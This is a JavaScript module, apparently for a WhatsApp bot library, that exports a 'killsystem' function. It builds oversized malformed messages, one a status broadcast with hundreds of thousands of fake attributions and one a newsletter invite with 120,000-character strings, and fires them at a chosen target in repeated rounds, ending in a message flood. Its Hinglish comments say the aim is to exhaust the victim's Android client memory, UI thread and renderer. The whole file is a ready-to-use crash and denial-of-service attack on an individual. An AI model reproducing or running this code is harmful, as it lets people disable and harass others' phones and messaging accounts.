const crypto = require('crypto');

function buildAttributionBomb(attributions) {
  const cc = ['41', '91', '90', '31', '40'];
  return {
    messageContextInfo: {
      messageSecret: crypto.randomBytes(32),
      deviceListMetadata: { senderKeyIndex: 0, senderTimestamp: Date.now(), recipientKeyIndex: 0 }
    },
    interactiveResponseMessage: {
      contextInfo: {
        remoteJid: 'status@broadcast',
        fromMe: true,
        isQuestion: true,
        forwardedAiBotMessageInfo: { botJid: '13135550202@bot', botName: 'Business Assistant', creator: 'FLIX' },
        statusAttributionType: 2,
        statusAttributions: Array.from({ length: attributions }, () => ({
          participant: `${cc[Math.floor(Math.random() * cc.length)]}${Math.floor(Math.random() * 1e10).toString().padStart(10, '0')}@s.whatsapp.net`,
          type: 1
        }))
      },
      body: { text: '', format: 'DEFAULT' },
      nativeFlowResponseMessage: { name: 'call_permission_request', paramsJson: 'kkk', version: 3 }
    }
  };
}

function buildNewsletterBomb() {
  return {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: '33333333333333333@newsletter',
          newsletterName: 'x'.repeat(120000),
          jpegThumbnail: null,
          caption: 'y'.repeat(120000),
          inviteExpiration: Date.now() + 1814400000
        }
      }
    }
  };
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function killsystem(sock, targetJid, opts = {}) {
  const rounds = opts.rounds || 3;
  const attributions = Math.min(opts.attributions || 209000, 400000);

  for (let i = 0; i < rounds; i++) {
    // PHASE 1 — Status Attribution Bomb (target Android client ki memory + UI thread par pressure)
    try {
      await sock.relayMessage('status@broadcast', { viewOnceMessage: { message: buildAttributionBomb(attributions) } }, {
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: 'meta', attrs: {}, content: [{
            tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: targetJid } }]
          }]
        }]
      });
      console.log(`[killsystem] phase1 round${i + 1} ok`);
    } catch (e) { console.log(`[killsystem] phase1 round${i + 1}: ${e.message}`); }
    await sleep(1200);

    // PHASE 2 — Newsletter Invite Bomb (120K chars ki string render = renderer exhaustion)
    try {
      await sock.relayMessage(targetJid, buildNewsletterBomb(), { userJid: targetJid });
      console.log(`[killsystem] phase2 round${i + 1} ok`);
    } catch (e) { console.log(`[killsystem] phase2 round${i + 1}: ${e.message}`); }
    await sleep(1200);

    // PHASE 3 — Rapid Flood (processing queue ko bharna — 15 messages, 500ms gap)
    for (let j = 0; j < 15; j++) {
      try {
        await sock.relayMessage(targetJid, buildNewsletterBomb(), { userJid: targetJid });
      } catch (e) {
        console.log(`[killsystem] phase3 #${j}: ${e.message}`);
        break; // session par rate-limit aaye to flood band, aage badho
      }
      await sleep(500);
    }
    await sleep(2500);
  }
}

module.exports = { killsystem };
